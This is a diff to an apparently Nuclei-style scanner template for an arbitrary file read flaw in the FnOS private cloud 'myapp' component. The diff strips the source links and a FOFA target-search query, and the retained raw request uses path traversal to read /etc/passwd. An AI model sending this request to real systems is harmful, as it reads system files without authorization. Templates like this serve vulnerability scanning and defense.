@@ -3,12 +3,8 @@ info:
   name: 飞牛私有云FnOS myapp存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ya4gvaq5ecz0si18'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ya4gvaq5ecz0si18
-    fofa: app="飞牛-私有云fnOS" || icon_hash="470295793"
 http:
 - raw:
   - 'GET /app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/passwd HTTP/1.1
